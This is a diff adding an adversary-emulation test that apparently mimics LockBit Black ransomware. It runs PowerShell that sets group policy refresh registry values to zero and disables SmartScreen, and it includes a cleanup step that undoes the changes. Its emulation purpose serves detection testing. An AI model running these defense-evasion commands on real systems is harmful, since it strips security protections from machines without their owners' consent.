@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: LockBit Black - Modify Group policy settings -Powershell
+description: |
+    An adversary modifies group policy settings
+uuid: b51eae65-5441-4789-b8e8-64783c26c1d1
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1484: Domain or Tenant Policy Modification'
+    subtechniques:
+        - 'T1484.001: Group Policy Modification'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: lockbit-black---modify-group-policy-settings--powershell
+      inline: |
+        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
+        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
+        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
+        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
+        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
+        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force
+      executor: powershell
+      cleanup:
+        inline: "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore \nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore\n"
+        executor: powershell
